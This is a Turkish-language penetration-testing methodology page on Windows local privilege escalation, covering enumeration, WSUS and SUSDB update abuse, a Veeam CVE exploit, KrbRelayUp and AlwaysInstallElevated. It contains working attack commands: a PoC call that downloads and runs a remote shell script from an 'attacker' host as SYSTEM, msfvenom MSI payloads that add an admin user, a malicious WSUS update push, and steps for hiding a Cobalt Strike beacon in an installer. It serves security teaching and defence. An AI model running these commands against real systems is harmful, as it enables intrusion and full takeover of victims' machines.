# Windows Yerel Yetki Yükseltme

{{#include ../../banners/hacktricks-training.md}}

### **Windows yerel yetki yükseltme vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Bu sayfa, birkaç temel kılavuzdaki genel Windows yetki yükseltme metodolojisini bir araya getirir.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Uygulamaya yönelik enumeration akışı ayrıca topluluk atölyelerinden ve kontrol listelerinden yararlanır.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Geçmişteki saldırı materyalleri, Windows yetki yükseltme hakkındaki DerbyCon sunumunu da içerir.<sup>[[5]](#references)</sup>

## Başlangıç Windows Teorisi

### Erişim Token'ları

**Windows erişim token'larının ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL'ler - DACL'ler/SACL'ler/ACE'ler

**ACL'ler - DACL'ler/SACL'ler/ACE'ler hakkında daha fazla bilgi için aşağıdaki sayfayı inceleyin:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Bütünlük Düzeyleri

**Windows'ta bütünlük düzeylerinin ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Güvenlik Denetimleri

Windows'ta **sistemi enumerate etmenizi**, çalıştırılabilir dosyaları çalıştırmanızı ve hatta **faaliyetlerinizin tespit edilmesini** önleyebilecek farklı unsurlar vardır. Yetki yükseltme enumeration'ına başlamadan önce aşağıdaki **sayfayı okumalı** ve tüm bu **savunma mekanizmalarını enumerate etmelisiniz**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Fiziksel erişim, çevrimdışı bir UEFI NVRAM düzenlemesini önyükleme öncesi DMA'ya ve Windows `SYSTEM` belleğine yama uygulama zincirine de dönüştürebilir:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess sessiz yükseltme

`RAiLaunchAdminProcess` aracılığıyla başlatılan UIAccess süreçleri, AppInfo güvenli yol denetimleri atlatıldığında istem göstermeden High IL düzeyine ulaşmak için kötüye kullanılabilir. UIAccess/Admin Protection atlatma iş akışına özel sayfayı burada inceleyin:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop erişilebilirlik kayıt defteri yayılımı, keyfi bir SYSTEM kayıt defteri yazma işlemi (RegPwn) için kötüye kullanılabilir:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Yeni Windows sürümlerinde, ayrıcalıklı bir yerel NTLM kimlik doğrulamasının yeniden kullanılmış bir SMB TCP bağlantısı üzerinden yansıtıldığı **SMB keyfi port** LPE yolu da sunulmuştur:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Sistem Bilgileri

### Sürüm bilgisi enumeration'ı

Windows sürümünde bilinen bir güvenlik açığı olup olmadığını kontrol edin (uygulanan yamaları da inceleyin).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Version Exploits

Bu [site](https://msrc.microsoft.com/update-guide/vulnerability), Microsoft güvenlik açıkları hakkında ayrıntılı bilgi aramak için kullanışlıdır. Bu veritabanında 4.700'den fazla güvenlik açığı bulunuyor; bu da Windows ortamının sunduğu **geniş saldırı yüzeyini** gösteriyor.

**Sistemde**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — işletim sistemi derlemesini, yüklü güncellemeleri ve ilgili olabilecek seçili güvenlik duyurularını listeler; bir sonucu geçerli kabul etmeden önce tam ürünü ve onun yerini alan güncellemeleri doğrulayın.

Sürüme özgü bir yerel exploit için işletim sistemi mimarisinin yanı sıra **çalışan işlemin mimarisini** de kontrol edin. 64 bit Windows'ta 32 bit bir işlem, [WOW64 dosya sistemi yönlendirmesine](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector) tabidir: `%windir%\System32` genellikle 32 bit sistem dizinine yönlendirilirken `%windir%\Sysnative` bu işlemin yerel sistem dizinine erişmesini sağlar. Bu diğer ad 64 bit bir işlemde kullanılamaz. Bir işletim sistemi derlemesi veya eksik KB adayı, exploit'in çalıştırılabilir olduğunu kanıtlamaz; çalışan derlemeyi, yüklü ya da onun yerini alan güncellemeyi, işlem mimarisini ve exploit ön koşullarını söz konusu sorunla ilgili [Microsoft güvenlik bülteniyle](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) karşılaştırın.

**Sistem bilgileriyle yerel olarak**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploit'lerin GitHub depoları:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ortam

Ortam değişkenlerinde kayıtlı herhangi bir kimlik bilgisi/Juicy bilgi var mı?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell Geçmişi

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Transcript dosyaları

Bunu nasıl etkinleştireceğinizi [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) adresinden öğrenebilirsiniz.

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` yalnızca bir örnektir. [PowerShell transcription ilkesi](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) normalde her kullanıcının Documents klasörüne yazar; ancak `OutputDirectory` ayarı veya `Start-Transcript -OutputDirectory`, dosyaları paylaşılan ya da gizli bir klasöre yönlendirebilir. Bir transkripti incelemeden önce etkin çıktı yolunu ve dosya ACL'sini kontrol edin: transkript, kimlik bilgileri dahil olmak üzere komut bağımsız değişkenlerini ve çıktıları içerebilir. Okunabilir bir transkript, yalnızca içeriği kullanılabilir bir yüksek ayrıcalıklı kimliği açığa çıkarıyorsa ve bu kimlik ilgili bağlamda oturum açabiliyorsa ipucu niteliğindedir.

### PowerShell Module Logging

PowerShell pipeline yürütmelerinin ayrıntıları; yürütülen komutlar, komut çağrıları ve betiklerin bazı bölümleri dahil olmak üzere kaydedilir. Ancak yürütme ayrıntılarının ve çıktı sonuçlarının tamamı yakalanmayabilir.

Bunu etkinleştirmek için belgelerin "Transcript files" bölümündeki talimatları izleyin ve **"Powershell Transcription"** yerine **"Module Logging"** seçeneğini tercih edin.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowersShell günlüklerinden son 15 olayı görüntülemek için şunu çalıştırabilirsiniz:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Betik yürütülürken etkinliklerin ve içeriğin tamamı kaydedilir; böylece her kod bloğu çalıştığı sırada belgelenir. Bu işlem, adli incelemeler ve kötü amaçlı davranışların analizi için değerli olan kapsamlı bir denetim izi sağlar. Yürütme anındaki tüm etkinlikler belgelenerek süreç hakkında ayrıntılı bilgiler sunulur.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block için günlük olayları Windows Event Viewer'da şu konumda bulunabilir: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Son 20 olayı görüntülemek için şunu kullanabilirsiniz:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### İnternet Ayarları

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Sürücüler

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Bir HTTP WSUS endpoint'i, güncelleme metadata'sının ele geçirilmesi olasılığını incelemek için ipucudur. Exploitation ayrıca istemcinin söz konusu WSUS sunucusunu kullanıp kullanmadığına, bir saldırganın trafiği ele geçirip geçiremeyeceğine veya kontrol edip edemeyeceğine ve istemcinin güncellemelere yönelik güven ve yükleme politikasına bağlıdır. URL tek başına code execution olduğunu göstermez. [Microsoft, WSUS metadata için TLS kullanılmasını önerir](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Önce cmd'de aşağıdaki komutu çalıştırarak ağın SSL kullanmayan bir WSUS güncellemesi kullanıp kullanmadığını kontrol edin:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Veya aşağıdakini PowerShell'de:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Aşağıdakilerden biri gibi bir yanıt alırsanız:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Ve `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` veya `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` değeri `1` ise.

`UseWUServer` değeri `1` olduğunda Windows Update, yapılandırılmış intranet hizmetini kullanır. Bu, HTTP trafiğine araya girme yolu için bir ön koşulun mevcut olduğunu doğrular; ancak araya girmenin, kötü amaçlı güncellemenin kabul edilmesinin veya yükseltilmiş ayrıcalıklarla kurulumun mümkün olduğunu kanıtlamaz. Değer `0` olduğunda, bu ilke kapsamında yapılandırılmış söz konusu WSUS uç noktası seçilmez.

Bu güvenlik açıklarını istismar etmek için [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) gibi araçları kullanabilirsiniz. Bunlar, SSL kullanmayan WSUS trafiğine "sahte" güncellemeler eklemek için kullanılan, MiTM saldırılarında silahlandırılmış exploit script'leridir.

Araştırmayı burada okuyun:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Raporun tamamını buradan okuyun**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Temel olarak, bu hata şu açıktan yararlanır:

> Yerel kullanıcı proxy'mizi değiştirme yetkimiz varsa ve Windows Updates, Internet Explorer ayarlarında yapılandırılmış proxy'yi kullanıyorsa, kendi trafiğimize araya girerek varlığımızda yükseltilmiş bir kullanıcı olarak kod çalıştırmak için [PyWSUS](https://github.com/GoSecure/pywsus) aracını yerel olarak çalıştırabiliriz.
>
> Ayrıca, WSUS hizmeti mevcut kullanıcının ayarlarını kullandığından, kullanıcının sertifika deposunu da kullanır. WSUS ana bilgisayar adı için kendinden imzalı bir sertifika oluşturup bu sertifikayı mevcut kullanıcının sertifika deposuna eklersek hem HTTP hem de HTTPS WSUS trafiğine araya girebiliriz. WSUS, sertifika üzerinde ilk kullanımda güven türü bir doğrulama uygulamak için HSTS benzeri mekanizmalar kullanmaz. Sunulan sertifika kullanıcı tarafından güvenilir kabul ediliyor ve doğru ana bilgisayar adına sahipse hizmet tarafından kabul edilir.

Bu güvenlik açığını [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) aracıyla istismar edebilirsiniz (araç kullanıma sunulduğunda).

### WSUS yöneticisi tarafından denetlenen güncellemeler

Mevcut kimliğin bir WSUS sunucusunda güncellemeleri **yayımlayıp onaylayabildiği** durumlarda ayrı bir yol söz konusudur. Sunucunun `WSUS Administrators` grubundaki etkin üyeliği ve devredilmiş WSUS izinlerini kontrol edin, ardından onaylanan güncellemeyi alacak istemci bilgisayar grubunu belirleyin. [Microsoft, güncellemeleri onaylamak için WSUS Administrator ayrıcalıklarını zorunlu tutar](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) ve [yayımlama güven ilişkisini belgeler](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): istemciler, yerel olarak yayımlanan içerik için kullanılan imzalama sertifikasına güvenmelidir. Bu yolu ayrıcalık yükseltme yöntemi olarak değerlendirmeden önce aday güncellemenin imzalı ve kabul edilmiş olduğunu, hedef için geçerli olduğunu ve daha ayrıcalıklı bir bağlamda kurulduğunu doğrulayın. Tek başına bir HTTP `WUServer` değeri veya grup adı bu koşulların sağlandığını göstermez.

### SUSDB özel güncelleme istismarı: `.txt`/`.esd` üzerinden imzasız payload'lar

Bu, HTTP WSUS bağlantısına araya girmekten farklı bir güven sınırı ihlalidir: ön koşul, özel bir güncellemeyi yayımlamak ve onaylamak için **WSUS veritabanındaki (`SUSDB`) saklı yordamları** kullanma yetkisidir. Kullanılabilecek yollardan biri, bir üst WSUS bilgisayar hesabının kimlik doğrulamasını `SUSDB` barındıran ayrı bir MSSQL sunucusuna aktarmaktır. Kesin ön koşul dağıtıma göre değişir; bu nedenle SQL administrator haklarınız olduğunu varsaymak yerine önce `EXECUTE` izinlerini listeleyin.<sup>[[38]](#references)[[39]](#references)</sup>

WSUS istemci kimlik doğrulamasını HTTP/8530'dan LDAP, SMB veya AD CS'ye aktaran ayrı saldırı yolu için bkz. [NTLM relay için WSUS HTTP'yi kötüye kullanma](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Güncellemeyi oluşturma, hedefleme ve onaylama

Özel güncelleme iş akışı, kısıtlı bir yayımlama API'si olarak meşru WSUS yordamlarını kullanır. Önemli durum geçişleri şunlardır:<sup>[[38]](#references)</sup>

| Aşama | İlgili saklı yordamlar |
| --- | --- |
| Güncelleme meta verilerini içe aktarma | `spImportUpdate` |
| Ön koşul, yerelleştirilmiş ve genişletilmiş XML parçalarını depolama | `spSaveXMLFragment` |
| İçerik özetiyle saldırgan denetimindeki URL'yi ilişkilendirme | `spSetBatchURL` |
| Bilgisayar grubunu listeleme/oluşturma ve istemciyi gruba ekleme | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| O grup için kurulumu onaylama | `@actionID = 0` ve `@isAssigned = 1` parametreleriyle `spDeployUpdate` |

Dosya adı, özetler, boyut ve `CommandLineInstallation` işleyicisi, içe aktarılan meta veriler ve parçalar arasında birbiriyle eşleşmelidir. İçerik URL'sini ve hedef grubunu atadıktan sonra son onay aşağıdakine benzer. Örnek GUID'leri yeniden kullanmak yerine yeni güncelleme, grup ve dağıtım tanımlayıcıları kullanın.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Uzantı tabanlı imza atlatma

WSUS normalde imzasız rastgele yürütülebilir içeriği reddeder. Ancak `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` içindeki .NET `VerifyFile` yolu, verilen dosya adı `.txt` veya `.esd` ile bitiyorsa sertifika denetimi bayrağını false olarak ayarlar; böylece baytların metin veya geçerli bir ESD görüntüsü olduğu önceden doğrulanmadan `CheckCertificateSignature` atlanır. Bu nedenle `payload.exe.txt` gibi yeniden adlandırılmış, değiştirilmemiş bir PE içerik doğrulamasından geçebilir ve daha sonra güncellemenin komut satırı yükleme işleyicisi tarafından başlatılabilir. Bu, imza sahteciliği değil, bir ilke/tür karışıklığı hatasıdır.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS uyumlu staging ve otomasyon

`spDeployUpdate` çağrıldığında WSUS, kaydedilen içeriği getirir. Kaynak, BITS'in HTTP beklentilerini karşılamalıdır: yalnızca erişilebilir bir URL yeterli değildir; aktarımda ilk `HEAD`/`GET` akışı ve byte-range istekleri kullanılır. Range desteği olmayan bir sunucu, BITS'in Range protokol başlığını gerektirdiğini belirten WSUS eşitleme `EventId=364` hatasına neden olur.<sup>[[39]](#references)</sup>

Araştırma PoC'si [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious), import/fragment/URL/group/deployment zinciri için gereken SQL'i oluşturur, bu SQL'i çalıştırmak için değiştirilmiş bir MSSQL istemcisi içerir ve içerik staging'i için `BitsWebServer.py` dosyasını sunar. Yetkili bir laboratuvarda kullanılabilecek temel bir komut şöyledir:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Gözetimsiz yürütme ve yeniden deneme yoluyla kalıcılık

İstemci tarafındaki etkileşim ilkeye bağlıdır. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` içindeki `4 - Auto download and schedule install` seçeneği, onaylanmış bir güncellemenin kullanıcı tarafından manuel olarak seçilmesine gerek kalmadan indirilip yapılandırılan zamanlamaya göre yüklenmesini sağlar. Testlerde, güncellemesi başarısız/tamamlanmamış durumda kalan bir payload, callback işlemi sonlandıktan hemen sonra yeniden sunuldu; dolayısıyla yeniden deneme davranışı, tekrarlanan yürütme yoluyla kalıcılığa dönüşebilir. İstemci güncelleme başarısız durumunu gösterdiği için bu yöntem kolayca fark edilir.<sup>[[39]](#references)</sup>

#### Tespit ve güçlendirme adımları

Bu zincirde sunucu ve istemci tarafında incelenebilecek noktalar:<sup>[[39]](#references)</sup>

- `SUSDB` içinde `spCreateTargetGroup`, `spSetBatchURL` ve `spDeployUpdate` çalıştırılmasını denetleyin; yeni hedefleme gruplarını, harici içerik kaynaklarını, `.txt`/`.esd` güncelleme payload’larını ve beklenmeyen kimlikler (özellikle bilgisayar hesabı olmayan hesaplar) tarafından yapılan dağıtımları araştırın.
- `C:\Program Files\Update Services\LogFiles` konumunda `ContentSyncAgent`, `FileVerified`, yanlış yazılmış `FileVerficationFailed` ve `EventId=364` kayıtlarını inceleyin; doğrulamayı uzantı ve içeriğin magic bytes değeriyle ilişkilendirin, uzantıya güvenmeyin.
- Windows Update’in tekrar tekrar başarısız olup yeniden denemesini ve `.txt` ya da `.esd` adını taşıyan içerikten kaynaklanan PE yürütmesini veya beklenmeyen alt süreç/ağ etkinliklerini araştırın.
- Desteklendiği durumlarda veritabanı hizmetinde Authentication için Extended Protection gerektirin ve veritabanına ağ erişimini WSUS sunucusu ile yetkili yönetim sistemleriyle sınırlandırın. Özel güncelleme prosedürlerindeki `EXECUTE` izinlerini en aza indirin ve denetleyin.

## Üçüncü Taraf Otomatik Güncelleyiciler ve Agent IPC (local privesc)

Birçok kurumsal agent, localhost üzerinde bir IPC arayüzü ve ayrıcalıklı bir güncelleme kanalı sunar. Kayıt işlemi saldırganın sunucusuna yönlendirilebiliyor ve güncelleyici sahte bir root CA’ya veya zayıf imzalayan denetimlerine güveniyorsa, yerel kullanıcı SYSTEM hizmetinin yükleyeceği kötü amaçlı bir MSI gönderebilir. Genelleştirilmiş bir tekniği (Netskope stAgentSvc zincirine dayalı – CVE-2025-0309) burada görebilirsiniz:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401 üzerinden SYSTEM)

Veeam Backup & Replication ve Cloud Connect, varsayılan olarak **TCP/9401** üzerinden bir temel yedekleme hizmeti kullanır. [Veeam’in duyurusu](https://www.veeam.com/kb4424), yedekleme ağının sınırları içindeki şifrelenmiş yapılandırma veritabanı kimlik bilgilerinin kimlik doğrulaması olmadan ifşa edilmesini açıklar; ayrı bir herkese açık PoC ise **NT AUTHORITY\SYSTEM** olarak komut yürütme yolunu gösterir.<sup>[[12]](#references)</sup> Hizmet localhost dışındaki adreslere de bağlanabilir; bu nedenle gerçek adresini ve PID’sini kontrol edin.

- **Recon**: TCP/9401’in `Veeam.Backup.Service.exe` işlemine ait olduğunu doğrulayın, ardından yüklü ürünü ve yama metaverilerini inceleyin. `netstat -ano | findstr 9401` ve `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` ipucu sağlar, ancak yama durumunu tam olarak doğrulamaz.
- **Düzeltilmiş sürüm eşikleri**: Veeam, ilk düzeltilmiş sürümler olarak **11a build 11.0.1.1261 P20230227** ve **12 build 12.0.0.1420 P20230223** sürümlerini listeler; daha eski sürümler etkilenir. Dört parçalı dosya sürümü tek başına, aynı build numaralarındaki yamalanmamış temel sürüm ile sonraki bir yamayı ayırt edemez. Bir eşik build’inin düzeltildiğini belirtmeden önce yama tanımlayıcısını [üreticinin build geçmişi](https://www.veeam.com/kb2680) ile doğrulayın.
- **Exploit**: `VeeamHax.exe` gibi bir PoC’yi gerekli Veeam DLL’leriyle aynı dizine yerleştirin, ardından yerel soket üzerinden SYSTEM payload’ını tetikleyin:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Alıntılanan PoC, ek ön koşullar sağlandığında SYSTEM olarak komut yürütüldüğünü gösterir; satıcının güvenlik duyurusu ise kimlik bilgisi ifşası sorununu açıklar.
## KrbRelayUp

Yerel bir Kerberos relay, uygun bir COM sunucusu kimlik doğrulaması yaptığında ve relay edilen principal hedef nesne üzerinde izinlere sahip olduğunda, düşük ayrıcalıklı bir oturum açma bağlamından ayrıcalıklı bir dizin yazma işlemine geçiş sağlayabilir. [KrbRelay belgeleri](https://github.com/cube0x0/KrbRelay) hem RBCD hem de `msDS-KeyCredentialLink` (shadow-credential) LDAP yazma işlemlerini açıklar; KrbRelayUp bu yollardan bazılarını otomatikleştirir. RBCD zinciri, uygun delegasyon ve hedef nesne izinleri gerektirirken shadow-credential zinciri, key-credential yazma izinlerini ve sertifika kimlik doğrulama yolunu destekleyen bir KDC'yi gerektirir. Bu yollardan hiçbiri yalnızca etki alanı üyeliğinden kaynaklanmaz.

Gerçek DC'nin [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) ve [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) ilkelerini, relay edilen kimliğin nesne ACL'sini ve seçilen COM sınıfının kimlik doğrulama ve impersonation düzeylerini kontrol edin. Çağıranın oturum açma türü ve kimlik bilgisi bağlamı önemlidir: WinRM oturumu, etkileşimli oturumdan veya yeni kimlik bilgileriyle açılan oturumdan farklı davranabilir. Güvenlik duvarı/OXID yönlendirmesi ve yüklü güncellemeler de sonucu değiştirebilir. İzin verici bir ilkeyi veya eşleşen bir ACL'yi incelenmesi gereken bir durum olarak değerlendirin; pasif enumeration, COM coercion, relay kimlik doğrulaması veya dizine yazma işlemlerini tetiklememelidir. Bir makine hesabının shadow credential'ı, makine bileti alınmasını sağlayabilir ve yalnızca bu hesap gerekli dizin replikasyonu izinlerine sahipse, ayrı bir DCSync yoluna yol açabilir.

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) adresinde **exploit'i bulun**

Saldırı akışı hakkında daha fazla bilgi için [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup> adresine bakın.

## AlwaysInstallElevated

Bu 2 kayıt defteri anahtarı **etkinse** (değerleri **0x1** ise), herhangi bir ayrıcalık düzeyindeki kullanıcılar `*.msi` dosyalarını NT AUTHORITY\\**SYSTEM** olarak **yükleyebilir** (yürütebilir).

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Bir meterpreter session'ınız varsa, bu tekniği **`exploit/windows/local/always_install_elevated`** modülünü kullanarak otomatikleştirebilirsiniz.

### PowerUP

Mevcut dizinde ayrıcalıkları yükseltmek için bir Windows MSI binary'si oluşturmak üzere power-up'taki `Write-UserAddMSI` komutunu kullanın. Bu script, kullanıcı/grup ekleme istemi gösteren önceden derlenmiş bir MSI installer yazar (bu nedenle GIU erişimine ihtiyacınız olacak):

```
Write-UserAddMSI
```

Oluşturulan binary’yi çalıştırarak yetkileri yükseltin.

### MSI Wrapper

Bu araçla MSI wrapper oluşturmayı öğrenmek için bu öğreticiyi okuyun. Yalnızca **komut satırlarını** **çalıştırmak** istiyorsanız bir "**.bat**" dosyasını da wrapper içine alabileceğinizi unutmayın.


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX ile MSI Oluşturma


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio ile MSI Oluşturma

- Cobalt Strike veya Metasploit ile `C:\privesc\beacon.exe` konumunda **yeni bir Windows EXE TCP payload** **oluşturun**.
- **Visual Studio**’yu açın, **Create a new project**’i seçin ve arama kutusuna "installer" yazın. **Setup Wizard** projesini seçip **Next**’e tıklayın.
- Projeye **AlwaysPrivesc** gibi bir ad verin, konum olarak **`C:\privesc`** kullanın, **place solution and project in the same directory**’yi seçin ve **Create**’e tıklayın.
- 4. adımın 3.’süne (eklenecek dosyaları seçme) gelene kadar **Next**’e tıklamaya devam edin. **Add**’e tıklayın ve az önce oluşturduğunuz Beacon payload’ını seçin. Ardından **Finish**’e tıklayın.
- **Solution Explorer**’da **AlwaysPrivesc** projesini vurgulayın ve **Properties** bölümünde **TargetPlatform** değerini **x86**’dan **x64**’e değiştirin.
  - Yüklü uygulamanın daha meşru görünmesini sağlayabilecek **Author** ve **Manufacturer** gibi başka özellikleri de değiştirebilirsiniz.
- Projeye sağ tıklayın ve **View > Custom Actions**’ı seçin.
- **Install**’a sağ tıklayın ve **Add Custom Action**’ı seçin.
- **Application Folder**’a çift tıklayın, **beacon.exe** dosyanızı seçin ve **OK**’e tıklayın. Böylece yükleyici çalıştırılır çalıştırılmaz Beacon payload’ı yürütülür.
- **Custom Action Properties** altında **Run64Bit** değerini **True** olarak değiştirin.
- Son olarak **build edin**.
